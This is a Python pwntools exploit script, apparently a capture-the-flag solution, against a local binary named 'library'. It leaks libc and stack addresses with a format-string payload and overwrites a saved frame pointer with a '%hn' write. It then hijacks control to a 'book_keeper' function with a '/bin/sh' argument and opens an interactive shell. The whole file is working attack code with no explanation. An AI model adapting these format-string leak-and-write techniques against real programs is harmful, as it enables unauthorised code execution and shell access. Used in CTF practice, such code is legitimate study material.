from pwn import*

elf = context.binary = ELF('./library')
libc = ELF('./libc.so.6')
p = process()

readBookSavedRIP = 0x18eb
libcLeakOffset = 0xdb073
choice2rbp = 0x10

def leak():
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    log.info('initiating leak...')
    p.sendline(b'1')
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    payload = bytes(f"%3$p,%8$p,%9$p", "utf-8")
    p.sendline(payload)
    log.info('sent leak_payload')
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    p.sendline(b'\x00')
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    log.info('intiating leak read...')
    p.sendline(b'2')
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    p.sendline(b'0')
    p.recvuntil(b'\x1b[32mTitle: \x1b[0m')
    leak = p.recvline()
    leak = leak[:len(leak)-0x1]
    leak = leak.split(b',')
    libcLeak = int(leak[0], 16)
    log.info('leaked libc address: ' + hex(libcLeak))
    savedRBP = int(leak[1], 16)
    log.info('leaked saved rbp: ' + hex(savedRBP))
    savedRIP = int(leak[2], 16)
    log.info('leaked saved rip: ' + hex(savedRIP))
    return libcLeak, savedRBP, savedRIP

libcLeak, savedRBP, savedRIP = leak()
log.success("found menu's saved rbp address: " + hex(savedRBP))
libc.address = libcLeak - libcLeakOffset
binsh = next(libc.search(b'/bin/sh'))
log.success("found libc's base address: " + hex(libc.address))
elf.address = savedRIP - readBookSavedRIP
log.success("found binary's base address: " + hex(elf.address))

def write2menuSavedRBP(data):
    data2write = data & 0xffff
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    log.info('initiating write payload...')
    p.sendline(b'1')
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    payload = bytes(f"%{data2write}c%8$hn", "utf-8")
    p.sendline(payload)
    log.info('sent write_payload')
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    p.sendline(b'\x00')
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    log.info('intiating write operation')
    p.sendline(b'2')
    log.info('put the value: ' + hex(data) + ' in the memory location: ' + hex(savedRBP))
    p.recvuntil(b'\x1b[34m>\x1b[0m ')
    p.sendline(b'1')


def prepareHijack():
    addressOfChoiceP1 = savedRBP-choice2rbp-0x8
    write2menuSavedRBP(addressOfChoiceP1)

prepareHijack()

def hijack():
    p.recvuntil(b'>\x1b[0m ')
    payload = bytes(str(elf.sym['book_keeper']), "utf-8")
    p.sendline(payload)
    log.info('sent hijack_payload')

hijack()

def popShell():
    p.recvuntil(b'>\x1b[0m ')
    payload = bytes(hex(binsh), "utf-8")
    p.sendline(payload)
    log.success('popping a shell...')
    p.recvuntil(b'reveals...')

popShell()

p.interactive()
